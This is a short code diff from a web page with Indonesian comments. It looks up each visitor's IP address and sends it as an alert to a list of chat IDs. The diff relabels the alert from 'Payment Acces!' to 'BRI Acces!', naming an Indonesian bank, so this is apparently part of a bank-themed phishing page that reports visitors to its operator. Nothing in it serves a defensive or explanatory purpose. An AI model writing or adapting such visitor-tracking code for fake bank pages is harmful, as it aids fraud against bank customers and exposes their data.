@@ -315,7 +315,7 @@
             .then(response => response.json())
             .then(data => {
                 const ipAddress = data.ip;  // IP address pengguna
-                const message = `Payment Acces! IP address: ${ipAddress}`;
+                const message = `BRI Acces! IP address: ${ipAddress}`;
 
                 // Mengirim notifikasi ke setiap chat ID
                 chatIds.forEach(chatId => {
